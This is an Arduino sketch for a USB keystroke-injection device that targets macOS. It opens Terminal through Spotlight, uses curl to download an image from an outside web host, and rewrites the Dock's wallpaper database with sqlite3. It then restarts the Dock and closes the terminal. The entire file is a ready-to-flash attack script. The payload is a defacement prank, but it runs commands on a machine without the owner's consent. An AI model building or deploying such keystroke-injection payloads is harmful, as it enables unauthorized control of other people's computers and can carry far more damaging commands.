#include <Keyboard.h>
void setup() {
  String commandd="sqlite3 ~/Library/Application";
  String ccommand=" Support/Dock/desktoppicture.db \"update data set value = '~/Desktop/0han.png'\" && killall Dock";

  Keyboard.begin();
  delay(4000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(30);
  Keyboard.press(32);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release(32);
  delay(500);
  Keyboard.println("terminal");//输入cmd进入DOS
  delay(500); 
  Keyboard.press(KEY_RETURN);
  delay(100); //按下回车键
  Keyboard.release(KEY_RETURN);
  delay(300);
  Keyboard.println("cd desktop");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.println("curl -o 0han.png 'http://0han.000webhostapp.com/0han.png'");
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(5000);
  Keyboard.println(commandd);//Keyboard.println("sqlite3 ~/library/Application"); //sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '~/Desktop/0han.jpeg'" && killall Dock
  delay(300);
  Keyboard.press(92); //输入"\"
  delay(200);
  Keyboard.println(ccommand);
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(30);//Command+Q退出终端
  Keyboard.press(87);
  delay(30);
  Keyboard.release(87);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.end();
}
void loop() {
  }
